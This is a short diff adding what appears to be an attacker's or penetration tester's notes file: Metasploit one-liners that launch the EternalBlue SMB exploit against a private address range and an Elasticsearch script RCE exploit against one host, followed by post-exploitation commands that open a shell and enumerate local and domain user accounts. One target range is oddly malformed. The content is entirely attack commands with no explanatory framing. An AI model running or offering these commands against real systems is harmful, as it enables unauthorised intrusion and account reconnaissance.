@@ -1,0 +1,7 @@
+maybe try
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts 192.168.52.1-100/combined/192.168.52.70/; exploit;"
+shell
+net user
+net user /domain
+dir
+msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts 192.168.52.60; exploit;"
